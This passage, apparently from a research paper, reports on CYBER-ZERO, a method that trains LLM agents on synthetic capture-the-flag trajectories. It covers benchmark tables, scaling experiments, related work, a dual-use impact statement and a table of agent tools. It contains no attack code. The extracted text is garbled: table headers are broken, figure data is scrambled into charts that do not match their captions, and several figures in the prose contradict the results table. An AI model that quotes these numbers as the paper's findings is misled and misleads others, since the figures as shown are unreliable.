**Training** We fine-tuned three model families: Qwen3 (Yang et al., 2025a), Qwen2.5-Instruct (Hui et al., 2024), and SWE-agent-LM (Yang et al., 2025b) (fine-tuned from Qwen2.5-Coder-Instruct). All models are trained using supervised fine-tuning via NVIDIA NeMo framework (Kuchaiev et al., 2019). Due to the limited compute, we only retain the synthesized samples with the maximum of 32,768 tokens, resulting in the total number of 9,464 trajectories. The hyperparameters are consistently set as the global batch size of 16, the learning rate of 5e-6, and the epoch of 2.

Table 3: Pass@1 of models fine-tuned on 9,464 CYBER-ZERO trajectories using ENIGMA+. To minimize the randomness, we use the greedy decoding for generation. **ZS** : zero-shot performance; **FT** :fine-tuned performance; ∆: absolute improvement. We denote the fine-tuned Qwen3 will as our CYBER-ZERO models. Additional analysis in Appendix D.

|**Model**|**Inter**|**Code-C**|**TF (%)**|**NY**|**U CTF**|**(%)**|**Cy**|**bench**|**(%)**|**Av**|**erage**|**(%)**|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|**Size**|ZS|FT|∆|ZS|FT|∆|ZS|FT|∆|ZS|FT|∆ |||**_Qwe_**|**_n-3_ (m**|**ain)**||||||
|8B|46.5|64.8|+18.3|0.8|6.3|+5.5|5.0|10.0|+5.0|14.2|23.2|+9.0|
|14B|55.0|73.6|+18.6|2.6|9.9|+7.3|12.5|20.0|+7.5|18.6|29.1|+10.5|
|32B|60.0|82.4|+22.4|4.7|13.5|+8.8|5.0|17.5|+12.5|20.3|33.4|+13.1 |||**_Qwen_**|**_2.5-Ins_**|**_truct_**||||||
|7B|34.1|47.3|+13.2|2.0|4.2|+2.2|0.0|7.5|+7.5|10.8|16.8|+6.0|
|14B|44.0|68.1|+24.1|3.1|7.3|+4.2|5.0|17.5|+12.5|14.9|25.7|+10.8|
|32B|68.1|71.4|+3.3|4.7|9.9|+5.2|10.0|15.0|+5.0|23.2|27.9|+4.6 |||**_SWE A_**|**_gentic_**|**_LLMs_**||||||
|7B|0|46.2|+46.2|0|4.7|+4.7|0|7.5|+7.5|0|16.7|+16.7|
|32B|34.1|71.4|+37.3|4.2|6.8|+2.6|5.0|17.5|+12.5|12.7|25.6|+13.6|


3.2 RESULT ANALYSIS

In this section, we evaluate all LLMs with the Pass@1 metric, where we sample one trajectory per task and validate if the model captures the correct flag. Table 3 presents performance comparisons between zero-shot and fine-tuned models across all benchmarks.


```mermaid
xychart-beta
    title "Average Performance vs Model Size"
    x-axis ["8B", "14B", "32B", "100B", "1000B"]
    y-axis "Average Performance (%)" 5 --> 45
    bar [13, 20, 22, 30, 43]
```


<!-- Start of picture text -->
45<br>Claude-3.7<br>Sonnet<br>40<br>Claude-3.5<br>35 Sonnet<br>Gemini-2.5<br>30 Cyber-Zero Flash<br>32B DeepSeek-V3<br>0324<br>Cyber-Zero<br>25 14B<br>20<br>Cyber-Zero Qwen3<br>8B 32B<br>Qwen3<br>15 14B<br>10<br>Qwen3<br>8B<br>5<br>8 14 32 100 1000 ???<br>Model Size (B parameters, log scale)<br>Average Performance (%)<br><!-- End of picture text -->

Figure 3: Comparison of various LLMs across model size (log-scale billions of parameters), Pass@1 performance (%), and cost-effectiveness (bubble size). We denote _cost-effectiveness_ as the ratio of performance to token inference cost (in $) on the flag-captured CTF challenges. We note that the token prices are the lowest one listed on OpenRouter. Appendix C provides the detailed overall performance against the cost.

**CYBER-ZERO training enables effective vulnerability exploitation.** Fine-tuning on CYBERZERO trajectories yields consistent performance improvements across all CTF benchmarks. For instance, in the zero-shot setting, Qwen-3-32B solves 4.5% of NYU CTF Bench tasks, 69.7% on InterCode-CTF, and 12.5% on Cybench. After fine-tuning, the model achieves an average absolute improvement of 6.2% across the three benchmarks. These gains suggest that training with highquality trajectories enhances the agent’s ability to reason about binary analysis, construct effective shell commands, and exploit CTF challenges. Notably, fine-tuned agents exhibit superior capability in parsing noisy outputs (particularly from decompiled binaries) and making progress without getting stuck, which are crucial factors for high success rates in these complex, multi-step environments.

**SWE agents cannot generalize on cybersecurity tasks.** Despite being built on Qwen2.5-CoderInstruct and trained for complex software engineering tasks, SWE-agent-LM models demonstrate poor cybersecurity performance. SWE-agent-LM-7B achieves 0% success rate across all benchmarks in zero-shot evaluation. Manual inspection reveals fundamental instruction-following failures, suggesting severe overfitting to software engineering tasks. While SWE-agent-LM-32B maintains basic instruction-following capabilities, its performance remains inferior to the base Qwen2.5-32B-Instruct model across all benchmarks, despite having specialized training in complex agentic tasks. This gap highlights that the skills required for debugging or code completion do not transfer to cybersecurity tasks, which demand deeper exploration, vulnerability detection, and interaction with specialized security toolchains. These results underscore the importance of domain-specific training to enable effective generalization in agentic settings.

**Performance scales predictably with model size.** Table 3 reverals consistent performance scaling with model capacity. For instance, zero-shot average Pass@1 rise from 14.2% (CYBER-ZERO-8B) to 20.3% (CYBER-ZERO-32B), with similar trends across all model families. This consistent scaling effect suggests that larger models possess greater capacity to reason across longer contexts, compose commands, and maintain internal state across multiple interactions. While fine-tuning substantially enhances performance, the underlying model capacity remains a strong predictor of success in complex CTF environments.


**Fine-tuned agents achieve superior cost-effectiveness.** Figure 3 illustrates a compelling trade-off between performance and cost across different models. Proprietary models such as Claude-3.7-Sonnet and Claude-3.5-Sonnet achieve strong zero-shot performance (43.3% and 37.2% respectively) but incur high costs, averaging $44.4 and $22.2 to complete those successful tasks. In contrast, CYBERZERO-32B achieves the comparable performance of 33.4% success rate with significantly lower cost per task. Moreover, CYBER-ZERO models maintain the similar cost-effectiveness to their base models while delivering significantly better performance. These findings demonstrate that agents trained on CYBER-ZERO trajectories not only achieve competitive performance but also offer superior cost-effectiveness and sample efficiency for practical cybersecurity applications.

### 4 SCALING CYBERSECURITY AGENTS

Understanding how cybersecurity agents scale across different dimensions is crucial for advancing their effectiveness and generalizability. In this section, we investigate three key scaling dimensions through controlled experiment: (1) _inference-time compute_ : whether increased sampling improves performance and how fine-tuned models benefit from additional rollouts, (2) _task diversity_ :how training on varied challenges affects cross-benchmark generalization, and (3) _trajectory density_ : whether multiple synthetic trajectories per task enhance agent performance. Each dimension provides insights into the opportunities and limitations of scaling cybersecurity agents.


```mermaid
xychart-beta
    title "InterCode-CTF, NYU CTF, Cybench Pass@k vs Rollouts"
    x-axis "Number of Agent Rollouts (k)" 1 --> 5
    y-axis "Pass@k (%)" 30 --> 80
    line [37, 49, 53, 55, 55]
    line [53, 61, 64, 65, 66]
    line [61, 70, 71, 71, 71]
    line [72, 77, 78, 78, 79]
```


<!-- Start of picture text -->
InterCode-CTF NYU CTF Cybench<br>80 10 25<br>70 8 20<br>60 6 15<br>50 4 10<br>40 5<br>2<br>30 0<br>1 2 3 4 5 1 2 3 4 5 1 2 3 4 5<br>Number of Agent Rollouts (k) Number of Agent Rollouts (k) Number of Agent Rollouts (k)<br>Qwen3-8B Qwen3-14B Cyber-Zero-8B Cyber-Zero-14B<br>Pass@k (%)<br><!-- End of picture text -->

Figure 4: Effect of inference-time compute budgets. Zero-shot and fine-tuned Qwen3 models (8B & - 14B) evaluated on three cybersecurity benchmarks (the temperature of 0.6 and top p of 0.95) exhibit increasing scores with variance computed following Lightman et al. (2023).

#### 4.1 SCALING WITH INFERENCE-TIME COMPUTE

**Setup.** We investigate how inference-time sampling affects performance by generating multiple rollouts per task and computing Pass@ _k_ for _k_ = _{_ 1 _,_ 2 _,_ 3 _,_ 4 _,_ 5 _}_ . We evaluate Qwen3 models (8B and 14B) in both zero-shot and fine-tuned variants using temperature 0.6 and top-p 0.95. Each trajectory is validated through exact flag matching. We report separate curves for each model variant across our three benchmarks.

**Analysis.** Figure 4 demonstrates that fine-tuned models consistently outperform their zero-shot counterparts across all sampling budgets. For instance, fine-tuned CYBER-ZERO-14B improves from 2.6% Pass@1 to 4.2% Pass@2 on NYU CTF Bench, and the gap widens as _k_ increases. This pattern is consistent with prior findings in software engineering agent evaluation (Wei et al., 2025b; Yang et al., 2025b), where repeated sampling benefits models only when their candidate solutions are diverse and grounded in effective reasoning patterns. Moreover, the improvement curves for fine-tuned models show diminishing returns beyond _k_ = 5, suggesting that most useful reasoning paths are already captured within the first few samples.

#### 4.2 SCALING WITH TASK DIVERSITY

**Setup.** To assess how the variety of training tasks affects generalization, we fine-tune Qwen3 models (8B, 14B, and 32B) on progressively larger subsets of the CYBER-ZERO dataset: 10%, 20%, 50%, and 100% of available challenges. Following our standard setupSection 2.3, we generate 3 trajectories per task and keep training parameters fixed. Evaluation uses greedy decoding Pass@1 across all three benchmarks.


```mermaid
xychart-beta
    title "InterCode-CTF Pass@1 vs Coverage"
    x-axis ["0", "10", "20", "50", "100"]
    y-axis "Pass@1 (%)" 45 --> 85
    line [46, 55, 57, 60, 65]
    line [55, 58, 60, 66, 73]
    line [60, 66, 70, 76, 82]
```


<!-- Start of picture text -->
InterCode-CTF NYU CTF Cybench<br>20<br>80<br>70 10 15<br>60 5 10<br>50<br>5<br>0 10 20 50 100 0 10 20 50 100 0 10 20 50 100<br>Challenge Coverage (%) Challenge Coverage (%) Challenge Coverage (%)<br>Cyber-Zero-8B Cyber-Zero-14B Cyber-Zero-32B<br>Pass@1 (%)<br><!-- End of picture text -->

Figure 5: Effect of training task diversity. Models trained on increasing percentages of available CTF challenges show consistent performance gains across all benchmarks.

**Analysis.** Figure 5 demonstrates that expanding training task diversity yields monotonic performance improvements across all benchmarks. For example, on InterCode-CTF, CYBER-ZERO-14B improves from 58.2% to 73.6% when scaling the task coverage from 10% to 100%. This consistent improvement pattern suggests that exposure to diverse challenge types enhances models’ ability to recognize and exploit varied vulnerability patterns. Interestingly, the gains are less pronounced on professional-level benchmarks like Cybench compared to educational challenges in InterCode-CTF. This disparity indicates that complex, real-world challenges require more sophisticated reasoning that may be harder to capture through unverified synthetic trajectories alone.

#### 4.3 SCALING WITH DATA SAMPLING


```mermaid
xychart-beta
    title "InterCode-CTF Pass@1 vs Trajectories"
    x-axis ["1", "2", "3"]
    y-axis "Pass@1 (%)" 0 --> 75
    bar [60, 64, 65]
    bar [67, 71, 74]
```


<!-- Start of picture text -->
InterCode-CTF NYU CTF Cybench<br>10 20.0<br>70<br>17.5<br>60 8<br>15.0<br>50<br>6 12.5<br>40<br>10.0<br>30 4 7.5<br>20 5.0<br>2<br>10 2.5<br>0 0 0.0<br>1 2 3 1 2 3 1 2 3<br>Trajectories per Challenge Trajectories per Challenge Trajectories per Challenge<br>Cyber-Zero-8B Cyber-Zero-14B<br>Pass@1 (%)<br><!-- End of picture text -->

Figure 6: Effect of trajectory density. Increasing the number of synthetic trajectories per task during training consistently improves performance, with particularly strong gains on complex challenges.

**Setup.** We examine how trajectory density affects downstream performance by varying the number of synthetic trajectories generated per CTF writeup. We compare models trained with 1, 2, and 3 trajectories per task, maintaining constant task coverage to isolate the effect of trajectory diversity.

**Analysis.** Figure 6 reveals that denser trajectory sampling substantially improves performance across all benchmarks. For CYBER-ZERO-14B on NYU CTF Bench, performance increases by 73% relatively from 5.7% (1 trajectory) to 9.9% (3 trajectories). Benefits are particularly pronounced for long-horizon or under-determined tasks, where single sampled solutions may miss critical decision points or reflect suboptimal reasoning paths.

This finding parallels results from trajectory-based learning in other domains (Pan et al., 2024), where multiple demonstrations per problem expose models to richer variation in reasoning paths, repair behavior, and error recovery. The consistent improvements across model sizes suggest that trajectory diversity provides complementary benefits to model capacity, enabling more robust learning of cybersecurity problem-solving patterns.


### 5 RELATED WORK

**LLM Agents for Offensive Cybersecurity** The application of LLM agents to cybersecurity challenges has gained significant traction, with multiple frameworks developed for solving CTF challenges in dockerized environments (Yang et al., 2023; Shao et al., 2024; Zhang et al., 2025; Mayoral-Vilches et al., 2025). These frameworks typically use Kali Linux for pre-installed cybersecurity tools. These frameworks serve as foundations for broader offensive cybersecurity applications, where LLMs are employed to conduct penetration testing, exploit security weaknesses, and craft cyberattacks (Charan et al., 2023; Deng et al., 2024; Fang et al., 2024). CyberSecEval benchmarks (Bhatt et al., 2023; Wan et al., 2024) provide problems specifically designed to assess the security risks and capabilities of LLMs in assisting with cyberattacks, while other work (Phuong et al., 2024; Guo et al., 2024) explores the "dangerous capabilities" of LLMs, evaluating their performance on various tasks including CTF challenges, though achieving relatively lower results on the latter. Recent advances have introduced more sophisticated agent architectures. Project Naptime (Glazunov & Brand, 2024) and Big Sleep (Allamanis et al., 2024) developed an agent benchmarked on CyberSecEval2 that successfully discovered a new SQLite vulnerability using tools such as debuggers and web browsers. EnIGMA (Abramovich et al., 2025) surpasses existing baselines by integrating specialized cybersecurity tools and interactive interfaces tailored for LLM agents, achieving higher success rates on the InterCode, NYU CTF, and Cybench benchmarks. Unlike prior methods relying on the agent scaffold-dependent approaches, we introduce a new training paradigm that fundamentally improves models’ capability of handling cybersecurity tasks.

**Training LLM Agents to Code** Previous training paradigms for coding in software engineering tasks have primarily focused on general programming capabilities (Li et al., 2023; Lozhkov et al., 2024; Muennighoff et al., 2024; Zhuo et al., 2024; Wei et al., 2024). While existing scaffolds have successfully leveraged proprietary language models to address real-world software engineering challenges, open models consistently underperform, motivating research into domain-specific training approaches. Several notable efforts have emerged in this direction. Lingma SWE-GPT (Ma et al., 2024) introduces 7B and 72B models(Hui et al., 2024), employing an iterative development-processcentric methodology. SWE-Gym (Pan et al., 2024) presents the first open training environment for software engineering agents, achieving substantial improvements on SWE-bench. More recently, SWE-Fixer (Xie et al., 2025) creates specialized code retriever andeditors, while SWE-RL (Wei et al., 2025b) employs reinforcement learning (RL) (Grattafiori et al., 2024) to enable self-improvement through RL incentives. Despite these advances in software engineering, our work represents the first training paradigm specifically designed for cybersecurity tasks, addressing a critical gap where code-focused training fails to transfer to security domains.

**Benchmarking Models’ Cybersecurity Capabilities** Various benchmarks have been developed to evaluate language models on cybersecurity-related tasks. Multiple-choice question based datasets (Li et al., 2024; Tihanyi et al., 2024; Liu, 2023) typically provide limited insights due to their high sensitivity to prompt formatting (Qi et al., 2024; Łucki et al., 2024) and insufficient alignment with real-world operational contexts. Carlini et al. (2025) introduced AutoAdvExBench, which evaluates LLMs on their ability to autonomously compromise image-based adversarial defenses, while CybersecEval (Bhatt et al., 2023) concentrates on single-turn exploitation of code snippets, though this approach lacks the interactive nature of realistic scenarios. Agent-based frameworks incorporating tool usage provide superior approximations of real-world conditions. Consequently, numerous studies have adopted Capture-the-Flag challenges as proxies for assessing security capabilities. More recent frameworks (e.g., Abramovich et al. (2025); Mayoral-Vilches et al. (2025)) have further advanced the field by integrating interactive simulations with structured attack-chain analyses.

### 6 CONCLUSION

We introduce CYBER-ZERO, the first runtime-free framework for synthesizing agent trajectories to train LLM-based cybersecurity agents. Through our novel persona-driven simulation approach, we achieve up to 13.1% absolute performance gains over baseline methods, with our best CYBERZERO-32B model achieving performance comparable to state-of-the-art proprietary models like Claude-3.5-Sonnet and DeepSeek-V3-0324 across three major CTF benchmarks. Our approach addresses the fundamental challenge of training data scarcity in cybersecurity by eliminating the


dependency on executable environments while maintaining the quality and authenticity of training trajectories. Our results demonstrate that high-quality synthetic trajectories can effectively close the performance gap between open and proprietary models, suggesting that the democratization of advanced cybersecurity capabilities is not only feasible but imminent.

### IMPACT STATEMENT

We acknowledge the dual-use nature of our work. While CYBER-ZERO is designed to strengthen cybersecurity by enabling developers and security researchers to discover and remediate vulnerabilities before software deployment via penetration testing, these same capabilities could potentially be leveraged for offensive purposes, including discovering and exploiting vulnerabilities in external software systems or developing malicious tools. The runtime-free approach we propose further amplifies this concern by making advanced cybersecurity agent training more accessible, potentially lowering the barrier to entry for both defensive and offensive applications.

Our evaluation demonstrates that models trained on synthesized trajectories can achieve state-of-theart performance comparable to frontier proprietary models, suggesting that the democratization of cybersecurity capabilities is both technically feasible and rapidly approaching. As the cybersecurity capabilities of LLMs continue to advance, we encourage continued collaboration between researchers, model developers, and safety institutions to ensure that these powerful tools are developed and deployed responsibly. We believe that open research and transparency, balanced with appropriate safeguards, ultimately strengthens our collective security posture.

### ACKNOWLEDGEMENT

We are deeply grateful to the ENIGMA team for open-sourcing the agent scaffold and reformatted benchmark data. We thank Yangruibo Ding for valuable early discussions, Andy Zhang from Cybench for helping us verify the dataset issue, and Sajjad “JJ” Arshad for maintaining one of the world’s largest CTF archives that collects hundreds of CTF competitions. In addition, we thank Johnathan Duffie, Anoop Deoras, and Stefano Soatto for their support. Lastly, we would like to express our appreciation to every CTF player who takes the time to write detailed, informative writeups contributing to the collective knowledge that makes research like ours possible.

### REFERENCES

- Talor Abramovich, Meet Udeshi, Minghao Shao, Kilian Lieret, Haoran Xi, Kimberly Milner, Sofija Jancheska, John Yang, Carlos E Jimenez, Farshad Khorrami, et al. Enigma: Interactive tools substantially assist lm agents in finding security vulnerabilities. In _Forty-second International Conference on Machine Learning_ , 2025.

- Miltiadis Allamanis, Martin Arjovsky, Charles Blundell, Lars Buesing, Maddie Brand, Sergei Glazunov, David Maier, Petros Maniatis, Guilherme Marinho, Henryk Michalewski, Koushik Sen, Charles Sutton, Varun Tulsyan, Matteo Vanotti, Thomas Weber, and Dawn Zheng. From naptime to big sleep: Using large language models to catch vulnerabilities in real-world code. https://googleprojectzero.blogspot.com/2024/10/ from-naptime-to-big-sleep.html, November 2024. Accessed July 2025.

- Anthropic. Claude 3.7 “Sonnet” System Card. https://assets.anthropic.com/m/ 785e231869ea8b3b/original/claude-3-7-sonnet-system-card.pdf, 2025a. Accessed: 2025-07-03.

- Anthropic. System Card: Claude Opus 4 & Claude Sonnet 4. Technical report, Anthropic, May 2025b. Accessed: 2025-07-03.

- Manish Bhatt, Sahana Chennabasappa, Cyrus Nikolaidis, Shengye Wan, Ivan Evtimov, Dominik Gabi, Daniel Song, Faizan Ahmad, Cornelius Aschermann, Lorenzo Fontana, et al. Purple llama cyberseceval: A secure coding benchmark for language models. _arXiv preprint arXiv:2312.04724_ , 2023.


- Nicholas Carlini, Javier Rando, Edoardo Debenedetti, Milad Nasr, and Florian Tramèr. Autoadvexbench: Benchmarking autonomous exploitation of adversarial example defenses. _

- PV Charan, Hrushikesh Chunduri, P Mohan Anand, and Sandeep K Shukla. From text to mitre techniques: Exploring the malicious use of large language models for generating cyber attack payloads. _

- Mark Chen, Jerry Tworek, Heewoo Jun, Qiming Yuan, Henrique Ponde De Oliveira Pinto, Jared Kaplan, Harri Edwards, Yuri Burda, Nicholas Joseph, Greg Brockman, et al. Evaluating large language models trained on code. _

- DARPA. DARPA AIxCC, 2024. https://aicyberchallenge.com/about/, 2024. Accessed: 2025-07-03.

- Gelei Deng, Yi Liu, Víctor Mayoral-Vilches, Peng Liu, Yuekang Li, Yuan Xu, Tianwei Zhang, Yang Liu, Martin Pinzger, and Stefan Rass. _{_ PentestGPT _}_ : Evaluating and harnessing large language models for automated penetration testing. In _33rd USENIX Security Symposium (USENIX Security 24)_ , pp. 847–864, 2024.

- Connor Dilgren, Purva Chiniya, Luke Griffith, Yu Ding, and Yizheng Chen. Secrepobench: Benchmarking llms for secure code generation in real-world repositories. _

- Yangruibo Ding, Yanjun Fu, Omniyyah Ibrahim, Chawin Sitawarin, Xinyun Chen, Basel Alomair, David Wagner, Baishakhi Ray, and Yizheng Chen. Vulnerability detection with code language models: How far are we? In _2025 IEEE/ACM 47th International Conference on Software Engineering (ICSE)_ , pp. 469–481. IEEE Computer Society, 2024.

- Richard Fang, Rohan Bindu, Akul Gupta, Qiusi Zhan, and Daniel Kang. Llm agents can autonomously hack websites. _

- Tao Ge, Xin Chan, Xiaoyang Wang, Dian Yu, Haitao Mi, and Dong Yu. Scaling synthetic data creation with 1,000,000,000 personas. _

- Sergei Glazunov and Maddie Brand. Project naptime: Evaluating offensive security capabilities of large language models. https://googleprojectzero.blogspot.com/2024/06/ project-naptime.html, June 2024. Accessed July 2025.

- Aaron Grattafiori, Abhimanyu Dubey, Abhinav Jauhri, Abhinav Pandey, Abhishek Kadian, Ahmad Al-Dahle, Aiesha Letman, Akhil Mathur, Alan Schelten, Alex Vaughan, et al. The llama 3 herd of models. _

- Chengquan Guo, Xun Liu, Chulin Xie, Andy Zhou, Yi Zeng, Zinan Lin, Dawn Song, and Bo Li. Redcode: Risky code execution and generation benchmark for code agents. _Advances in Neural Information Processing Systems_ , 37:106190–106236, 2024.

- Binyuan Hui, Jian Yang, Zeyu Cui, Jiaxi Yang, Dayiheng Liu, Lei Zhang, Tianyu Liu, Jiajun Zhang, Bowen Yu, Keming Lu, et al. Qwen2. 5-coder technical report. _

- Aaron Hurst, Adam Lerer, Adam P Goucher, Adam Perelman, Aditya Ramesh, Aidan Clark, AJ Ostrow, Akila Welihinda, Alan Hayes, Alec Radford, et al. Gpt-4o system card. _

- Aaron Jaech, Adam Kalai, Adam Lerer, Adam Richardson, Ahmed El-Kishky, Aiden Low, Alec Helyar, Aleksander Madry, Alex Beutel, Alex Carney, et al. Openai o1 system card. _

- Carlos E Jimenez, John Yang, Alexander Wettig, Shunyu Yao, Kexin Pei, Ofir Press, and Karthik R Narasimhan. Swe-bench: Can language models resolve real-world github issues? In _The Twelfth International Conference on Learning Representations_ , 2024.


- Oleksii Kuchaiev, Jason Li, Huyen Nguyen, Oleksii Hrinchuk, Ryan Leary, Boris Ginsburg, Samuel Kriman, Stanislav Beliaev, Vitaly Lavrukhin, Jack Cook, et al. Nemo: a toolkit for building ai applications using neural modules. _

- Nathaniel Li, Alexander Pan, Anjali Gopal, Summer Yue, Daniel Berrios, Alice Gatti, Justin D Li, Ann-Kathrin Dombrowski, Shashwat Goel, Gabriel Mukobi, et al. The wmdp benchmark: measuring and reducing malicious use with unlearning. In _Proceedings of the 41st International Conference on Machine Learning_ , pp. 28525–28550, 2024.

- Raymond Li, Loubna Ben Allal, Yangtian Zi, Niklas Muennighoff, Denis Kocetkov, Chenghao Mou, Marc Marone, Christopher Akiki, Jia Li, Jenny Chim, et al. Starcoder: may the source be with you! _

- Hunter Lightman, Vineet Kosaraju, Yuri Burda, Harrison Edwards, Bowen Baker, Teddy Lee, Jan Leike, John Schulman, Ilya Sutskever, and Karl Cobbe. Let’s verify step by step. In _The Twelfth International Conference on Learning Representations_ , 2023.

- Zefang Liu. Secqa: A concise question-answering dataset for evaluating large language models in computer security. _

- Anton Lozhkov, Raymond Li, Loubna Ben Allal, Federico Cassano, Joel Lamy-Poirier, Nouamane Tazi, Ao Tang, Dmytro Pykhtar, Jiawei Liu, Yuxiang Wei, et al. Starcoder 2 and the stack v2: The next generation. _

- Jakub Łucki, Boyi Wei, Yangsibo Huang, Peter Henderson, Florian Tramèr, and Javier Rando. An adversarial perspective on machine unlearning for ai safety. _

- Yingwei Ma, Rongyu Cao, Yongchang Cao, Yue Zhang, Jue Chen, Yibo Liu, Yuchen Liu, Binhua Li, Fei Huang, and Yongbin Li. Lingma swe-gpt: An open development-process-centric language model for automated software improvement. _

- Víctor Mayoral-Vilches, Luis Javier Navarrete-Lozano, María Sanz-Gómez, Lidia Salas Espejo, Martiño Crespo-Álvarez, Francisco Oca-Gonzalez, Francesco Balassone, Alfonso Glera-Picón, Unai Ayucar-Carbajo, Jon Ander Ruiz-Alcalde, et al. Cai: An open, bug bounty-ready cybersecurity ai. _

- Niklas Muennighoff, Qian Liu, Armel Randy Zebaze, Qinkai Zheng, Binyuan Hui, Terry Yue Zhuo, Swayam Singh, Xiangru Tang, Leandro Von Werra, and Shayne Longpre. Octopack: Instruction tuning code large language models. In _The Twelfth International Conference on Learning Representations_ , 2024.

- OWASP GenAI Project (CTI Layer Team). OWASP LLM Exploit Generation Version 1.0. Technical report, OWASP GenAI Project, February 2025. Accessed: 3 July 2025.

- Jiayi Pan, Xingyao Wang, Graham Neubig, Navdeep Jaitly, Heng Ji, Alane Suhr, and Yizhe Zhang. Training software engineering agents and verifiers with swe-gym. _

- M Phuong, M Aitchison, E Catt, S Cogan, A Kaskasoli, V Krakovna, D Lindner, M Rahtz, Y Assael, S Hodkinson, et al. Evaluating frontier models for dangerous capabilities. arxiv. _

- Xiangyu Qi, Boyi Wei, Nicholas Carlini, Yangsibo Huang, Tinghao Xie, Luxi He, Matthew Jagielski, Milad Nasr, Prateek Mittal, and Peter Henderson. On evaluating the durability of safeguards for open-weight llms. _

- Minghao Shao, Sofija Jancheska, Meet Udeshi, Brendan Dolan-Gavitt, Kimberly Milner, Boyuan Chen, Max Yin, Siddharth Garg, Prashanth Krishnamurthy, Farshad Khorrami, et al. Nyu ctf bench: A scalable open-source benchmark dataset for evaluating llms in offensive security. _Advances in Neural Information Processing Systems_ , 37:57472–57498, 2024.

- Jia Song and Jim Alves-Foss. The darpa cyber grand challenge: A competitor’s perspective. _IEEE Security & Privacy_ , 13(6):72–76, 2015.


- Norbert Tihanyi, Mohamed Amine Ferrag, Ridhi Jain, Tamas Bisztray, and Merouane Debbah. Cybermetric: a benchmark dataset based on retrieval-augmented generation for evaluating llms in cybersecurity knowledge. In _2024 IEEE International Conference on Cyber Security and Resilience (CSR)_ , pp. 296–302. IEEE, 2024.

- Saad Ullah, Mingji Han, Saurabh Pujar, Hammond Pearce, Ayse Coskun, and Gianluca Stringhini. Llms cannot reliably identify and reason about security vulnerabilities (yet?): A comprehensive evaluation, framework, and benchmarks. In _2024 IEEE Symposium on Security and Privacy (SP)_ , pp. 862–880. IEEE, 2024.

- Shengye Wan, Cyrus Nikolaidis, Daniel Song, David Molnar, James Crnkovich, Jayson Grace, Manish Bhatt, Sahana Chennabasappa, Spencer Whitman, Stephanie Ding, et al. Cyberseceval 3: Advancing the evaluation of cybersecurity risks and capabilities in large language models. _

- Peiran Wang, Xiaogeng Liu, and Chaowei Xiao. Cve-bench: Benchmarking llm-based software engineering agent’s ability to repair real-world cve vulnerabilities. In _Proceedings of the 2025 Conference of the Nations of the Americas Chapter of the Association for Computational Linguistics: Human Language Technologies (Volume 1: Long Papers)_ , pp. 4207–4224, 2025.

- Boyi Wei, Benedikt Stroebl, Jiacen Xu, Joie Zhang, Zhou Li, and Peter Henderson. Dynamic risk assessments for offensive cybersecurity agents. In _ICML 2025 Workshop on Computer Use Agents_ , 2025a.

- Yuxiang Wei, Zhe Wang, Jiawei Liu, Yifeng Ding, and Lingming Zhang. Magicoder: Empowering code generation with oss-instruct. In _International Conference on Machine Learning_ , pp. 52632– 52657. PMLR, 2024.

- Yuxiang Wei, Olivier Duchenne, Jade Copet, Quentin Carbonneaux, Lingming Zhang, Daniel Fried, Gabriel Synnaeve, Rishabh Singh, and Sida I Wang. Swe-rl: Advancing llm reasoning via reinforcement learning on open software evolution. _

- xAI. xAI Risk Management Framework (Draft). Technical report, xAI, February 2025. Draft version — accessed 3 July 2025.

- Chengxing Xie, Bowen Li, Chang Gao, He Du, Wai Lam, Difan Zou, and Kai Chen. Swe-fixer: Training open-source llms for effective and efficient github issue resolution. _

- An Yang, Anfeng Li, Baosong Yang, Beichen Zhang, Binyuan Hui, Bo Zheng, Bowen Yu, Chang Gao, Chengen Huang, Chenxu Lv, et al. Qwen3 technical report. _

- John Yang, Akshara Prabhakar, Karthik Narasimhan, and Shunyu Yao. Intercode: Standardizing and benchmarking interactive coding with execution feedback. _Advances in Neural Information Processing Systems_ , 36:23826–23854, 2023.

- John Yang, Carlos E Jimenez, Alexander Wettig, Kilian Lieret, Shunyu Yao, Karthik Narasimhan, and Ofir Press. Swe-agent: Agent-computer interfaces enable automated software engineering. _Advances in Neural Information Processing Systems_ , 37:50528–50652, 2024a.

- John Yang, Kilian Leret, Carlos E Jimenez, Alexander Wettig, Kabir Khandpur, Yanzhe Zhang, Binyuan Hui, Ofir Press, Ludwig Schmidt, and Diyi Yang. Swe-smith: Scaling data for software engineering agents. _

- Yu Yang, Yuzhou Nie, Zhun Wang, Yuheng Tang, Wenbo Guo, Bo Li, and Dawn Song. Seccodeplt: A unified platform for evaluating the security of code genai. _

- Andy K Zhang, Neil Perry, Riya Dulepet, Joey Ji, Celeste Menders, Justin W Lin, Eliot Jones, Gashon Hussein, Samantha Liu, Donovan Julian Jasper, Pura Peetathawatchai, Ari Glenn, Vikram Sivashankar, Daniel Zamoshchin, Leo Glikbarg, Derek Askaryar, Haoxiang Yang, Aolin Zhang, Rishi Alluri, Nathan Tran, Rinnara Sangpisit, Kenny O Oseleononmen, Dan Boneh, Daniel E. Ho,


and Percy Liang. Cybench: A framework for evaluating cybersecurity capabilities and risks of language models. In _The Thirteenth International Conference on Learning Representations_ , 2025. URL https://openreview.net/forum?id=tc90LV0yRL.

Terry Yue Zhuo, Armel Zebaze, Nitchakarn Suppattarachai, Leandro von Werra, Harm de Vries, Qian Liu, and Niklas Muennighoff. Astraios: Parameter-efficient instruction tuning code large language models. _

# **Appendix**

CONTENTS

|**A **|**Trai**|**ning**|**17**|
|---|---|---|--- |**B**|**Ben**|**chmark Issues**|**27** |**C **|**Cos**|**t-effectiveness of LLMs**|**27**|
|**D **|**Ana**|**lysis on Main Results**|**28**|
|**E **|**Abla**|**tion Studies**|**28**|
|**F**|**Qua**|**litative Studies on CYBER-ZERO Data**|**29** ||

### A TRAINING

#### A.1 EMULATED SCAFFOLDING INTERFACE

We simulate the ENIGMA Scaffold interface in CYBER-ZERO, and provide specialized tools inside Table 4 from the original ENIGMA paper (Abramovich et al., 2025). While we provide the interface to the models for data generation, there is no guarantees that they will utilize the customized tools regularly.

Table 4: In additional to the standard Linux Bash commands and the SWE-agent specialized tools, we provide ENIGMA with tools in the offensive cybersecurity domain, including binary decompilation and disassemble, and interactive agent tools for debugging and connecting to remote servers. Required arguments are enclosed in <> and optional arguments are in []. The last column shows the documentation presented to the LLMs.

|Category|Command|Documentation|
|---|---|---|
|_Static_<br>_analysis_|**decompile** <binary_path><br>[-function_name<br><function_name>]|Decompile a binary and prints the decompilation of a<br>given function name, or main by default.|
||**disassemble** <binary_path><br>[-function_name<br><function_name>]|Disassembles a binary and prints the disassembly of a<br>given function name, or main by default.|
